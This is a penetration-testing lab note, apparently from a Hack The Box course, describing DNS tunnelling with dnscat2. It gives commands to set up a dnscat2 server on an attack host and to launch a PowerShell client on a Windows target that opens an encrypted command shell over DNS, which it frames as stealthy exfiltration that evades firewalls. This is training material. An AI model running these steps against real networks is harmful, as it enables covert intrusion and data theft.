# DNS Tunneling with Dnscat2

***

{% hint style="warning" %}
Dnscat2 est un outil de tunneling qui utilise le protocole DNS pour envoyer des données entre deux hôtes. Il utilise un canal chiffré de Command-&-Control (**C\&C** ou **C2**) et envoie des données à l’intérieur des enregistrements TXT du protocole DNS.

D’habitude, chaque environnement de domaine Active Directory dans un réseau d’entreprise aura son propre serveur DNS, qui résoudra les noms d’hôte en adresses IP et acheminera le trafic vers des serveurs DNS externes participant au système DNS global. Cependant, avec **dnscat2**, la résolution d’adresse est demandée à un **serveur externe**. Lorsqu’un serveur DNS local tente de résoudre une adresse, les **données sont exfiltrées et envoyées sur le réseau** au lieu d’une requête DNS légitime.

**Dnscat2** peut être une approche extrêmement furtive pour exfiltrer des données tout en **échappant aux détections des pare-feu** qui analysent les connexions HTTPS et inspectent le trafic.

Pour notre exemple de test, nous pouvons utiliser un **serveur dnscat2** sur notre hôte d’attaque et exécuter le **client dnscat2** sur une autre machine Windows.
{% endhint %}

***

### <mark style="color:red;">Setting Up & Using dnscat2</mark>

<mark style="color:green;">**Cloning dnscat2 and Setting Up the Server**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

<mark style="color:green;">**Starting the dnscat2 server**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
{% endcode %}

{% hint style="info" %}
After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.
{% endhint %}

<mark style="color:green;">**Cloning dnscat2-powershell to the Attack Host**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
{% endcode %}

<mark style="color:green;">**Importing dnscat2.ps1**</mark>

```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

{% code overflow="wrap" fullWidth="true" %}
```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```
{% endcode %}

We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

<mark style="color:green;">**Confirming Session Establishment**</mark>

```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

We can list the options we have with dnscat2 by entering `?` at the prompt.

<mark style="color:green;">**Listing dnscat2 Options**</mark>

```shell-session
dnscat2> ?
```

We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let's interact with our established session and drop into a shell.

<mark style="color:green;">**Interacting with the Established Session**</mark>

```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```
